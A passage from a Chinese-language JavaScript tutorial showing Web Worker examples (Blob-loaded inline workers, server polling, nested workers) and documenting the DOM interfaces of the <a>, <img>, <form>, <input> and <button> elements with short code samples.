   通常情况下，Worker 载入的是一个单独的 JavaScript 脚本文件，但是也可以载入与主线程在同一个网页的代码。

   .. code:: html

      <!DOCTYPE html>
        <body>
          <script id="worker" type="app/worker">
            addEventListener('message', function () {
              postMessage('some message');
            }, false);
          </script>
        </body>
      </html>

   上面是一段嵌入网页的脚本，注意必须指定 ``<script>`` 标签的 ``type`` 属性是一个浏览器不认识的值，上例是 ``app/worker`` 。

   然后，读取这一段嵌入页面的脚本，用 Worker 来处理。

   .. code:: javascript

      var blob = new Blob([document.querySelector('#worker').textContent]);
      var url = window.URL.createObjectURL(blob);
      var worker = new Worker(url);
   
      worker.onmessage = function (e) {
        // e.data === 'some message'
      };

   上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。

实例：Worker 线程完成轮询
----------------------

   有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。

   .. code:: javascript

      function createWorker(f) {
        var blob = new Blob(['(' + f.toString() + ')()']);
        var url = window.URL.createObjectURL(blob);
        var worker = new Worker(url);
        return worker;
      }
   
      var pollingWorker = createWorker(function (e) {
        var cache;
   
        function compare(new, old) { ... };
   
        setInterval(function () {
          fetch('/my-api-endpoint').then(function (res) {
            var data = res.json();
   
            if (!compare(data, cache)) {
              cache = data;
              self.postMessage(data);
            }
          })
        }, 1000)
      });
   
      pollingWorker.onmessage = function () {
        // render data
      }
   
      pollingWorker.postMessage('init');

   上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。

实例： Worker 新建 Worker
------------------------

   Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。

   主线程代码如下。

   .. code:: javascript

      var worker = new Worker('worker.js');
      worker.onmessage = function (event) {
        document.getElementById('result').textContent = event.data;
      };

   Worker 线程代码如下。

   .. code:: javascript

      // worker.js
   
      // settings
      var num_workers = 10;
      var items_per_worker = 1000000;
   
      // start the workers
      var result = 0;
      var pending_workers = num_workers;
      for (var i = 0; i < num_workers; i += 1) {
        var worker = new Worker('core.js');
        worker.postMessage(i * items_per_worker);
        worker.postMessage((i + 1) * items_per_worker);
        worker.onmessage = storeResult;
      }
   
      // handle the results
      function storeResult(event) {
        result += event.data;
        pending_workers -= 1;
        if (pending_workers <= 0)
          postMessage(result); // finished!
      }

   上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。

   .. code:: javascript

      // core.js
      var start;
      onmessage = getStart;
      function getStart(event) {
        start = event.data;
        onmessage = getEnd;
      }
   
      var end;
      function getEnd(event) {
        end = event.data;
        onmessage = null;
        work();
      }
   
      function work() {
        var result = 0;
        for (var i = start; i < end; i += 1) {
          // perform some complex calculation here
          result += 1;
        }
        postMessage(result);
        close();
      }

API
----


主线程
~~~~~

   浏览器原生提供 ``Worker()`` 构造函数，用来供主线程生成 Worker 线程。

   .. code:: javascript

      var myWorker = new Worker(jsUrl, options);

    ``Worker()`` 构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。

   .. code:: javascript

      // 主线程
      var myWorker = new Worker('worker.js', { name : 'myWorker' });
   
      // Worker 线程
      self.name // myWorker

    ``Worker()`` 构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。

   - Worker.onerror：指定 error 事件的监听函数。
   - Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在 ``Event.data`` 属性中。
   - Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。
   - Worker.postMessage()：向 Worker 线程发送消息。
   - Worker.terminate()：立即终止 Worker 线程。

Worker 线程
~~~~~~~~~~

   Web Worker 有自己的全局对象，不是主线程的 ``window`` ，而是一个专门为 Worker 定制的全局对象。因此定义在 ``window`` 上面的对象和方法不是全部都可以使用。

   Worker 线程有一些自己的全局属性和方法。

   - self.name： Worker 的名字。该属性只读，由构造函数指定。
   - self.onmessage：指定 ``message`` 事件的监听函数。
   - self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。
   - self.close()：关闭 Worker 线程。
   - self.postMessage()：向产生这个 Worker 的线程发送消息。
   - self.importScripts()：加载 JS 脚本。

   （完）


/🟡11. 附录：网页元素接口
================================================================================

/🟠 <a> 元素
============

    ``<a>`` 元素用来设置链接。除了网页元素的通用接口（ ``Node`` 接口、 ``Element`` 接口、 ``HTMLElement`` 接口），它还继承了 ``HTMLAnchorElement`` 接口和 ``HTMLHyperlinkElementUtils`` 接口。

属性
---


URL 相关属性
~~~~~~~~~~~

    ``<a>`` 元素有一系列 URL 相关属性，可以用来操作链接地址。这些属性的含义，可以参见 ``Location`` 对象的实例属性。

   - hash：片段识别符（以 ``#`` 开头）
   - host：主机和端口（默认端口80和443会省略）
   - hostname：主机名
   - href：完整的 URL
   - origin：协议、域名和端口
   - password：主机名前的密码
   - pathname：路径（以 ``/`` 开头）
   - port：端口
   - protocol：协议（包含尾部的冒号 ``:`` ）
   - search：查询字符串（以 ``?`` 开头）
   - username：主机名前的用户名

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="http://user:passwd@example.com:8081/index.html?bar=1#foo">test</a>
      var a = document.getElementById('test');
      a.hash // "#foo"
      a.host // "example.com:8081"
      a.hostname // "example.com"
      a.href // "http://user:passed@example.com:8081/index.html?bar=1#foo"
      a.origin // "http://example.com:8081"
      a.password // "passwd"
      a.pathname // "/index.html"
      a.port // "8081"
      a.protocol // "http:"
      a.search // "?bar=1"
      a.username // "user"

   除了 ``origin`` 属性是只读的，上面这些属性都是可读写的。

accessKey 属性
~~~~~~~~~~~~~~

    ``accessKey`` 属性用来读写 ``<a>`` 元素的快捷键。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="http://example.com">test</a>
      var a = document.getElementById('test');
      a.accessKey = 'k';

   上面代码设置 ``<a>`` 元素的快捷键为 ``k`` ，以后只要按下这个快捷键，浏览器就会跳转到 ``example.com`` 。

   注意，不同的浏览器在不同的操作系统下，唤起快捷键的功能键组合是[不一样](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey)的。比如，Chrome 浏览器在 Linux 系统下，需要按下 ``Alt + k`` ，才会跳转到 ``example.com`` 。

download 属性
~~~~~~~~~~~~

    ``download`` 属性表示当前链接不是用来浏览，而是用来下载的。它的值是一个字符串，表示用户下载得到的文件名。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="foo.jpg">下载</a>
      var a = document.getElementById('test');
      a.download = 'bar.jpg';

   上面代码中， ``<a>`` 元素是一个图片链接，默认情况下，点击后图片会在当前窗口加载。设置了 ``download`` 属性以后，再点击这个链接，就会下载对话框，询问用户保存位置，而且下载的文件名为 ``bar.jpg`` 。

hreflang 属性
~~~~~~~~~~~~

    ``hreflang`` 属性用来读写 ``<a>`` 元素的 HTML 属性 ``hreflang`` ，表示链接指向的资源的语言，比如 ``hreflang="en"`` 。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="https://example.com" hreflang="en">test</a>
      var a = document.getElementById('test');
      a.hreflang // "en"

referrerPolicy 属性
~~~~~~~~~~~~~~~~~~~

    ``referrerPolicy`` 属性用来读写 ``<a>`` 元素的 HTML 属性 ``referrerPolicy`` ，指定当用户点击链接时，如何发送 HTTP 头信息的 ``referer`` 字段。

   HTTP 头信息的 ``referer`` 字段，表示当前请求是从哪里来的。它的格式可以由 ``<a>`` 元素的 ``referrerPolicy`` 属性指定，共有三个值可以选择。

   -  ``no-referrer`` ：不发送 ``referer`` 字段。
   -  ``origin`` ： ``referer`` 字段的值是 ``<a>`` 元素的 ``origin`` 属性，即协议 + 主机名 + 端口。
   -  ``unsafe-url`` ： ``referer`` 字段的值是 ``origin`` 属性再加上路径，但不包含 ``#`` 片段。这种格式提供的信息最详细，可能存在信息泄漏的风险。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="https://example.com" referrerpolicy="no-referrer">test</a>
      var a = document.getElementById('test');
      a.referrerPolicy // "no-referrer"

rel 属性
~~~~~~~

    ``rel`` 属性用来读写 ``<a>`` 元素的 HTML 属性 ``rel`` ，表示链接与当前文档的关系。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="https://example.com" rel="license">license.html</a>
      var a = document.getElementById('test');
      a.rel // "license"

tabIndex 属性
~~~~~~~~~~~~

    ``tabIndex`` 属性的值是一个整数，用来读写当前 ``<a>`` 元素在文档里面的 Tab 键遍历顺序。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="https://example.com">test</a>
      var a = document.getElementById('test');
      a.tabIndex // 0

target 属性
~~~~~~~~~~

    ``target`` 属性用来读写 ``<a>`` 元素的 HTML 属性 ``target`` 。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="https://example.com" target="_blank">test</a>
      var a = document.getElementById('test');
      a.target // "_blank"

text 属性
~~~~~~~~~

    ``text`` 属性用来读写 ``<a>`` 元素的链接文本，等同于当前节点的 ``textContent`` 属性。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" href="https://example.com">test</a>
      var a = document.getElementById('test');
      a.text // "test"

type 属性
~~~~~~~~~

    ``type`` 属性用来读写 ``<a>`` 元素的 HTML 属性 ``type`` ，表示链接目标的 MIME 类型。

   .. code:: javascript

      // HTML 代码如下
      // <a id="test" type="video/mp4" href="example.mp4">video</a>
      var a = document.getElementById('test');
      a.type // "video/mp4"

方法
---

    ``<a>`` 元素的方法都是继承的，主要有以下三个。

   -  ``blur()`` ：从当前元素移除键盘焦点，详见 ``HTMLElement`` 接口的介绍。
   -  ``focus()`` ：当前元素得到键盘焦点，详见 ``HTMLElement`` 接口的介绍。
   -  ``toString()`` ：返回当前 ``<a>`` 元素的 HTML 属性 ``href`` 。

/🟠 <img> 元素
==============

概述
---

    ``<img>`` 元素用于插入图片，主要继承了 HTMLImageElement 接口。

   浏览器提供一个原生构造函数 ``Image`` ，用于生成 ``HTMLImageElement`` 实例。

   .. code:: javascript

      var img = new Image();
      img instanceof Image // true
      img instanceof HTMLImageElement // true

    ``Image`` 构造函数可以接受两个整数作为参数，分别表示 ``<img>`` 元素的宽度和高度。

   .. code:: javascript

      // 语法
      Image(width, height)
   
      // 用法
      var myImage = new Image(100, 200);

    ``<img>`` 实例的 ``src`` 属性可以定义图像的网址。

   .. code:: javascript

      var img = new Image();
      img.src = 'picture.jpg';

   新生成的 ``<img>`` 实例并不属于文档的一部分。如果想让它显示在文档中，必须手动插入文档。

   .. code:: javascript

      var img = new Image();
      img.src = 'image1.png';
      document.body.appendChild(img);

   除了使用 ``Image`` 构造，下面的方法也可以得到 ``HTMLImageElement`` 实例。

   -  ``document.images`` 的成员
   - 节点选取方法（比如 ``document.getElementById`` ）得到的 ``<img>`` 节点
   -  ``document.createElement('img')`` 生成的 ``<img>`` 节点

   .. code:: javascript

      document.images[0] instanceof HTMLImageElement
      // true
   
      var img = document.getElementById('myImg');
      img instanceof HTMLImageElement
      // true
   
      var img = document.createElement('img');
      img instanceof HTMLImageElement
      // true

    ``HTMLImageElement`` 实例除了具有 Node、Element、HTMLElement 接口以外，还拥有一些独有的属性。这个接口没有定义自己的方法。

特性相关的属性
------------

   **（1）HTMLImageElement.src**

    ``HTMLImageElement.src`` 属性返回图像的完整网址。

   .. code:: javascript

      // HTML 代码如下
      // <img width="300" height="400" id="myImg" src="http://example.com/pic.jpg">
      var img = document.getElementById('img');
      img.src // http://example.com/pic.jpg

   **（2）HTMLImageElement.currentSrc**

    ``HTMLImageElement.currentSrc`` 属性返回当前正在展示的图像的网址。JavaScript 和 CSS 的 mediaQuery 都可能改变正在展示的图像。

   **（3）HTMLImageElement.alt**

    ``HTMLImageElement.alt`` 属性可以读写 ``<img>`` 的 HTML 属性 ``alt`` ，表示对图片的文字说明。

   **（4）HTMLImageElement.isMap，HTMLImageElement.useMap**

    ``HTMLImageElement.isMap`` 属性对应 ``<img>`` 元素的 HTML 属性 ``ismap`` ，返回一个布尔值，表示图像是否为服务器端的图像映射的一部分。

    ``HTMLImageElement.useMap`` 属性对应 ``<img>`` 元素的 HTML 属性 ``usemap`` ，表示当前图像对应的 ``<map>`` 元素。

   **（5）HTMLImageElement.srcset，HTMLImageElement.sizes**

    ``HTMLImageElement.srcset`` 属性和 ``HTMLImageElement.sizes`` 属性，分别用于读写 ``<img>`` 元素的 ``srcset`` 属性和 ``sizes`` 属性。它们用于 ``<img>`` 元素的响应式加载。 ``srcset`` 属性可以单独使用，但是 ``sizes`` 属性必须与 ``srcset`` 属性同时使用。

   .. code:: javascript

      // HTML 代码如下
      // <img srcset="example-320w.jpg 320w,
      //              example-480w.jpg 480w,
      //              example-800w.jpg 800w"
      //      sizes="(max-width: 320px) 280px,
      //             (max-width: 480px) 440px,
      //             800px"
      //      id="myImg"
      //      src="example-800w.jpg">
      var img = document.getElementById('myImg');
      img.srcset
      // "example-320w.jpg 320w,
      //  example-480w.jpg 480w,
      //  example-800w.jpg 800w"
   
      img.sizes
      // "(max-width: 320px) 280px,
      //  (max-width: 480px) 440px,
      //  800px"

   上面代码中， ``sizes`` 属性指定，对于小于 ``320px`` 的屏幕，图像的宽度为 ``280px`` ；对于小于 ``480px`` 的屏幕，图像宽度为 ``440px`` ；其他情况下，图像宽度为 ``800px`` 。然后，浏览器会根据当前屏幕下的图像宽度，到 ``srcset`` 属性加载宽度最接近的图像。

HTMLImageElement.width，HTMLImageElement.height
------------------------------------------------

    ``width`` 属性表示 ``<img>`` 的 HTML 宽度， ``height`` 属性表示高度。这两个属性返回的都是整数。

   .. code:: javascript

      // HTML 代码如下
      // <img width="300" height="400" id="myImg" src="pic.jpg">
      var img = document.getElementById('img');
      img.width // 300
      img.height // 400

   如果图像还没有加载，这两个属性返回的都是 ``0`` 。

   如果 HTML 代码没有设置 ``width`` 和 ``height`` 属性，则它们返回的是图像的实际宽度和高度，即 ``HTMLImageElement.naturalWidth`` 属性和 ``HTMLImageElement.naturalHeight`` 属性。

HTMLImageElement.naturalWidth HTMLImageElement.naturalHeight
--------------------------------------------------------------

    ``HTMLImageElement.naturalWidth`` 属性表示图像的实际宽度（单位像素）， ``HTMLImageElement.naturalHeight`` 属性表示实际高度。这两个属性返回的都是整数。

   如果图像还没有指定或不可得，这两个属性都等于 ``0`` 。

   .. code:: javascript

      var img = document.getElementById('img');
      if (img.naturalHeight > img.naturalWidth) {
        img.classList.add('portrait');
      }

   上面代码中，如果图片的高度大于宽度，则设为 ``portrait`` 模式。

HTMLImageElement.complete
--------------------------

    ``HTMLImageElement.complete`` 属性返回一个布尔值，表示图表是否已经加载完成。如果 ``<img>`` 元素没有 ``src`` 属性，也会返回 ``true`` 。

HTMLImageElement.crossOrigin
-----------------------------

    ``HTMLImageElement.crossOrigin`` 属性用于读写 ``<img>`` 元素的 ``crossorigin`` 属性，表示跨域设置。

   这个属性有两个可能的值。

   -  ``anonymous`` ：跨域请求不要求用户身份（credentials），这是默认值。
   -  ``use-credentials`` ：跨域请求要求用户身份。

   .. code:: javascript

      // HTML 代码如下
      // <img crossorigin="anonymous" id="myImg" src="pic.jpg">
      var img = document.getElementById('img');
      img.crossOrigin // "anonymous"

HTMLImageElement.referrerPolicy
--------------------------------

    ``HTMLImageElement.referrerPolicy`` 用来读写 ``<img>`` 元素的 HTML 属性 ``referrerpolicy`` ，表示请求图像资源时，如何处理 HTTP 请求的 ``referrer`` 字段。

   它有五个可能的值。

   -  ``no-referrer`` ：不带有 ``referrer`` 字段。
   -  ``no-referrer-when-downgrade`` ：如果请求的地址不是 HTTPS 协议，就不带有 ``referrer`` 字段，这是默认值。
   -  ``origin`` ： ``referrer`` 字段是当前网页的地址，包含协议、域名和端口。
   -  ``origin-when-cross-origin`` ：如果请求的地址与当前网页是同源关系，那么 ``referrer`` 字段将带有完整路径，否则将只包含协议、域名和端口。
   -  ``unsafe-url`` ： ``referrer`` 字段包含当前网页的地址，除了协议、域名和端口以外，还包括路径。这个设置是不安全的，因为会泄漏路径信息。

HTMLImageElement.x，HTMLImageElement.y
--------------------------------------

    ``HTMLImageElement.x`` 属性返回图像左上角相对于页面左上角的横坐标， ``HTMLImageElement.y`` 属性返回纵坐标。

事件属性
-------

   图像加载完成，会触发 ``onload`` 属性指定的回调函数。

   .. code:: javascript

      // HTML 代码为 <img src="example.jpg" onload="loadImage()">
      function loadImage() {
        console.log('Image is loaded');
      }

   图像加载过程中发生错误，会触发 ``onerror`` 属性指定的回调函数。

   .. code:: javascript

      // HTML 代码为 <img src="image.gif" onerror="myFunction()">
      function myFunction() {
        console.log('There is something wrong');
      }

/🟠 <form> 元素
===============

    ``<form>`` 元素代表了表单，继承了 HTMLFormElement 接口。

HTMLFormElement 的实例属性
------------------------

   -  ``elements`` ：返回一个类似数组的对象，成员是属于该表单的所有控件元素。该属性只读。
   -  ``length`` ：返回一个整数，表示属于该表单的控件数量。该属性只读。
   -  ``name`` ：字符串，表示该表单的名称。
   -  ``method`` ：字符串，表示提交给服务器时所使用的 HTTP 方法。
   -  ``target`` ：字符串，表示表单提交后，服务器返回的数据的展示位置。
   -  ``action`` ：字符串，表示表单提交数据的 URL。
   -  ``enctype`` （或 ``encoding`` ）：字符串，表示表单提交数据的编码方法，可能的值有 ``application/x-www-form-urlencoded`` 、 ``multipart/form-data`` 和 ``text/plain`` 。
   -  ``acceptCharset`` ：字符串，表示服务器所能接受的字符编码，多个编码格式之间使用逗号或空格分隔。
   -  ``autocomplete`` ：字符串 ``on`` 或 ``off`` ，表示浏览器是否要对 ``<input>`` 控件提供自动补全。
   -  ``noValidate`` ：布尔值，表示是否关闭表单的自动校验。

HTMLFormElement 的实例方法
------------------------

   -  ``submit()`` ：提交表单，但是不会触发 ``submit`` 事件和表单的自动校验。
   -  ``reset()`` ：重置表单控件的值为默认值。
   -  ``checkValidity()`` ：如果控件能够通过自动校验，返回 ``true`` ，否则返回 ``false`` ，同时触发 ``invalid`` 事件。

   下面是一个创建表单并提交的例子。

   .. code:: javascript

      var f = document.createElement('form');
      document.body.appendChild(f);
      f.action = '/cgi-bin/some.cgi';
      f.method = 'POST';
      f.submit();

/🟠 <input> 元素
================

    ``<input>`` 元素主要用于表单组件，它继承了 HTMLInputElement 接口。

HTMLInputElement 的实例属性
-------------------------


特征属性
~~~~~~~

   -  ``name`` ：字符串，表示 ``<input>`` 节点的名称。该属性可读写。
   -  ``type`` ：字符串，表示 ``<input>`` 节点的类型。该属性可读写。
   -  ``disabled`` ：布尔值，表示 ``<input>`` 节点是否禁止使用。一旦被禁止使用，表单提交时不会包含该 ``<input>`` 节点。该属性可读写。
   -  ``autofocus`` ：布尔值，表示页面加载时，该元素是否会自动获得焦点。该属性可读写。
   -  ``required`` ：布尔值，表示表单提交时，该 ``<input>`` 元素是否必填。该属性可读写。
   -  ``value`` ：字符串，表示该 ``<input>`` 节点的值。该属性可读写。
   -  ``validity`` ：返回一个 ``ValidityState`` 对象，表示 ``<input>`` 节点的校验状态。该属性只读。
   -  ``validationMessage`` ：字符串，表示该 ``<input>`` 节点的校验失败时，用户看到的报错信息。如果该节点不需要校验，或者通过校验，该属性为空字符串。该属性只读。
   -  ``willValidate`` ：布尔值，表示表单提交时，该 ``<input>`` 元素是否会被校验。该属性只读。

表单相关属性
~~~~~~~~~~

   -  ``form`` ：返回 ``<input>`` 元素所在的表单（ ``<form>`` ）节点。该属性只读。
   -  ``formAction`` ：字符串，表示表单提交时的服务器目标。该属性可读写，一旦设置了这个属性，会覆盖表单元素的 ``action`` 属性。
   -  ``formEncType`` ：字符串，表示表单提交时数据的编码方式。该属性可读写，一旦设置了这个属性，会覆盖表单元素的 ``enctype`` 的属性。
   -  ``formMethod`` ：字符串，表示表单提交时的 HTTP 方法。该属性可读写，一旦设置了这个属性，会覆盖表单元素的 ``method`` 属性。
   -  ``formNoValidate`` ：布尔值，表示表单提交时，是否要跳过校验。该属性可读写，一旦设置了这个属性，会覆盖表单元素的 ``formNoValidate`` 属性。
   -  ``formTarget`` ：字符串，表示表单提交后，服务器返回数据的打开位置。该属性可读写，一旦设置了这个属性，会覆盖表单元素的 ``target`` 属性。

文本输入框的特有属性
~~~~~~~~~~~~~~~~

   以下属性只有在 ``<input>`` 元素可以输入文本时才有效。

   -  ``autocomplete`` ：字符串 ``on`` 或 ``off`` ，表示该 ``<input>`` 节点的输入内容可以被浏览器自动补全。该属性可读写。
   -  ``maxLength`` ：整数，表示可以输入的字符串最大长度。如果设为负整数，会报错。该属性可读写。
   -  ``size`` ：整数，表示 ``<input>`` 节点的显示长度。如果类型是 ``text`` 或 ``password`` ，该属性的单位是字符个数，否则单位是像素。该属性可读写。
   -  ``pattern`` ：字符串，表示 ``<input>`` 节点的值应该满足的正则表达式。该属性可读写。
   -  ``placeholder`` ：字符串，表示该 ``<input>`` 节点的占位符，作为对元素的提示。该字符串不能包含回车或换行。该属性可读写。
   -  ``readOnly`` ：布尔值，表示用户是否可以修改该节点的值。该属性可读写。
   -  ``min`` ：字符串，表示该节点的最小数值或日期，且不能大于 ``max`` 属性。该属性可读写。
   -  ``max`` ：字符串，表示该节点的最大数值或日期，且不能小于 ``min`` 属性。该属性可读写。
   -  ``selectionStart`` ：整数，表示选中文本的起始位置。如果没有选中文本，返回光标在 ``<input>`` 元素内部的位置。该属性可读写。
   -  ``selectionEnd`` ：整数，表示选中文本的结束位置。如果没有选中文本，返回光标在 ``<input>`` 元素内部的位置。该属性可读写。
   -  ``selectionDirection`` ：字符串，表示选中文本的方向。可能的值包括 ``forward`` （与文字书写方向一致）、 ``backward`` （与文字书写方向相反）和 ``none`` （文字方向未知）。该属性可读写。

复选框和单选框的特有属性
~~~~~~~~~~~~~~~~~~~~

   如果 ``<input>`` 元素的类型是复选框（checkbox）或单选框（radio），会有下面的特有属性。

   -  ``checked`` ：布尔值，表示该 ``<input>`` 元素是否选中。该属性可读写。
   -  ``defaultChecked`` ：布尔值，表示该 ``<input>`` 元素默认是否选中。该属性可读写。
   -  ``indeterminate`` ：布尔值，表示该 ``<input>`` 元素是否还没有确定的状态。一旦用户点击过一次，该属性就会变成 ``false`` ，表示用户已经给出确定的状态了。该属性可读写。

图像按钮的特有属性
~~~~~~~~~~~~~~~

   如果 ``<input>`` 元素的类型是 ``image`` ，就会变成一个图像按钮，会有下面的特有属性。

   -  ``alt`` ：字符串，图像无法显示时的替代文本。该属性可读写。
   -  ``height`` ：字符串，表示该元素的高度（单位像素）。该属性可读写。
   -  ``src`` ：字符串，表示该元素的图片来源。该属性可读写。
   -  ``width`` ：字符串，表示该元素的宽度（单位像素）。该属性可读写。

文件上传按钮的特有属性
~~~~~~~~~~~~~~~~~~

   如果 ``<input>`` 元素的类型是 ``file`` ，就会变成一个文件上传按钮，会有下面的特有属性。

   -  ``accept`` ：字符串，表示该元素可以接受的文件类型，类型之间使用逗号分隔。该属性可读写。
   -  ``files`` ：返回一个 ``FileList`` 实例对象，包含了选中上传的一组 ``File`` 实例对象。

其他属性
~~~~~~~

   -  ``defaultValue`` ：字符串，表示该 ``<input>`` 节点的原始值。
   -  ``dirName`` ：字符串，表示文字方向。
   -  ``accessKey`` ：字符串，表示让该 ``<input>`` 节点获得焦点的某个字母键。
   -  ``list`` ：返回一个 ``<datalist>`` 节点，该节点必须绑定 ``<input>`` 元素，且 ``<input>`` 元素的类型必须可以输入文本，否则无效。该属性只读。
   -  ``multiple`` ：布尔值，表示是否可以选择多个值。
   -  ``labels`` ：返回一个 ``NodeList`` 实例，代表绑定当前 ``<input>`` 节点的 ``<label>`` 元素。该属性只读。
   -  ``step`` ：字符串，表示在 ``min`` 属性到 ``max`` 属性之间，每次递增或递减时的数值或时间。
   -  ``valueAsDate`` ： ``Date`` 实例，一旦设置，该 ``<input>`` 元素的值会被解释为指定的日期。如果无法解析该属性的值， ``<input>`` 节点的值将是 ``null`` 。
   -  ``valueAsNumber`` ：浮点数，当前 ``<input>`` 元素的值会被解析为这个数值。如果输入框为空，该属性返回 ``NaN`` 。

   下面是 ``valueAsNumber`` 属性的例子。

   .. code:: javascript

      /* HTML 代码如下
         <input type="number" value="1.234" />
      */
   
      input.value // "1.234"
      input.valueAsNumber // 1.234

HTMLInputElement 的实例方法
-------------------------

   -  ``focus()`` ：当前 ``<input>`` 元素获得焦点。
   -  ``blur()`` ：移除 ``<input>`` 元素的焦点。
   -  ``select()`` ：选中 ``<input>`` 元素内部的所有文本。该方法不能保证 ``<input>`` 获得焦点，最好先用 ``focus()`` 方法，再用这个方法。
   -  ``click()`` ：模拟鼠标点击当前的 ``<input>`` 元素。
   -  ``setSelectionRange()`` ：选中 ``<input>`` 元素内部的一段文本，但不会将焦点转移到选中的文本。该方法接受三个参数，第一个参数是开始的位置（从0开始），第二个参数是结束的位置（不包括该位置），第三个参数是可选的，表示选择的方向，有三个可能的值（ ``forward`` 、 ``backward`` 和默认值 ``none`` ）。
   -  ``setRangeText()`` ：新文本替换选中的文本。该方法接受四个参数，第一个参数是新文本，第二个参数是替换的开始位置(从 ``0`` 开始计算)，第三个参数是结束位置（该位置不包括在内），第四个参数表示替换后的行为（可选），有四个可能的值： ``select`` （选中新插入的文本）、 ``start`` （光标位置移到插入的文本之前）、 ``end`` （光标位置移到插入的文本之后）、 ``preserve`` （默认值，如果原先就有文本被选中且本次替换位置与原先选中位置有交集，则替换后同时选中新插入的文本与原先选中的文本，否则保持原先选中的文本）。
   -  ``setCustomValidity()`` ：该方法用于自定义校验失败时的报错信息。它的参数就是报错的提示信息。注意，一旦设置了自定义报错信息，该字段就不会校验通过了，因此用户重新输入时，必须将自定义报错信息设为空字符串，请看下面的例子。
   -  ``checkValidity()`` ：返回一个布尔值，表示当前节点的校验结果。如果返回 ``false`` ，表示不满足校验要求，否则就是校验成功或不必校验。
   -  ``stepDown()`` ：将当前 ``<input>`` 节点的值减少一个步长。该方法可以接受一个整数 ``n`` 作为参数，表示一次性减少 ``n`` 个步长，默认是 ``1`` 。有几种情况会抛错：当前 ``<input>`` 节点不适合递减或递增、当前节点没有 ``step`` 属性、 ``<input>`` 节点的值不能转为数字、递减之后的值小于 ``min`` 属性或大于 ``max`` 属性。
   -  ``stepUp()`` ：将当前 ``<input>`` 节点的值增加一个步长。其他与 ``stepDown()`` 方法相同。

   下面是 ``setSelectionRange()`` 方法的一个例子。

   .. code:: javascript

      /* HTML 代码如下
        <p><input type="text" id="mytextbox" size="20" value="HelloWorld"/></p>
        <p><button onclick="SelectText()">选择文本</button></p>
      */
   
      function SelectText() {
        var input = document.getElementById('mytextbox');
        input.focus();
        input.setSelectionRange(2, 5);
      }

   上面代码中，点击按钮以后，会选中 ``llo`` 三个字符。

   下面是 ``setCustomValidity()`` 的例子。

   .. code:: javascript

      /* HTML 代码如下
        <form id="form">
          <input id="field" type="text" pattern="[a-f,0-9]{4}" autocomplete=off>
        </form>
      */
   
      const form   = document.querySelector('#form');
      const field  = document.querySelector('#field');
   
      form.addEventListener('submit', (e) => {
        e.preventDefault(); // 防止这个例子发出 POST 请求
      });
   
      field.oninvalid = (event) => {
        event.target.setCustomValidity('必须是一个 4 位十六进制数');
      }
   
      field.oninput = (event) => {
        event.target.setCustomValidity('');
      }

   上面代码中，输入框必须输入一个4位的十六进制数。如果不满足条件（比如输入 ``xxx`` ），按下回车键以后，就会提示自定义的报错信息。一旦自定义了报错信息，输入框就会一直处于校验失败状态，因此重新输入时，必须把自定义报错信息设为空字符串。另外，为了避免自动补全提示框遮住报错信息，必须将输入框的 ``autocomplete`` 属性关闭。

/🟠 <button> 元素
=================

    ``<button>`` 元素继承了 ``HTMLButtonElement`` 接口。它有以下的实例属性。

   **（1）HTMLButtonElement.accessKey**

    ``HTMLButtonElement.accessKey`` 属性返回一个字符串，表示键盘上对应的键，通过 ``Alt + 这个键`` 可以让按钮获得焦点。该属性可读写。

   **（2）HTMLButtonElement.autofocus**

    ``HTMLButtonElement.autofocus`` 属性是一个布尔值，表示页面加载过程中，按钮是否会自动获得焦点。该属性可读写。

   **（3）HTMLButtonElement.disabled**

    ``HTMLButtonElement.disabled`` 属性是一个布尔值，表示该按钮是否禁止点击。该属性可读写。

   **（4）HTMLButtonElement.form**

    ``HTMLButtonElement.form`` 属性是一个表单元素，返回该按钮所在的表单。该属性只读。如果按钮不属于任何表单，该属性返回 ``null`` 。

   **（5）HTMLButtonElement.formAction**

    ``HTMLButtonElement.formAction`` 返回一个字符串，表示表单提交的 URL。该属性可读写，一旦设置了值，点击按钮就会提交到该属性指定的 URL，而不是 ``<form>`` 元素指定的 URL。

   **（6）HTMLButtonElement.formEnctype**

    ``HTMLButtonElement.formEnctype`` 属性是一个字符串，表示数据提交到服务器的编码类型。该属性可读写，一旦设置了值，点击按钮会按照该属性指定的编码方式，而不是 ``<form>`` 元素指定的编码方式。

   该属性可以取以下的值。

   -  ``application/x-www-form-urlencoded`` （默认值）
   -  ``multipart/form-data`` （上传文件的编码方式）
   -  ``text/plain`` 

   **（7）HTMLButtonElement.formMethod**

    ``HTMLButtonElement.formMethod`` 属性是一个字符串，表示浏览器提交表单的 HTTP 方法。该属性可读写，一旦设置了值，点击后就会采用该属性指定的 HTTP 方法，而不是 ``<form>`` 元素指定的编码方法。

   **（8）HTMLButtonElement.formNoValidate**

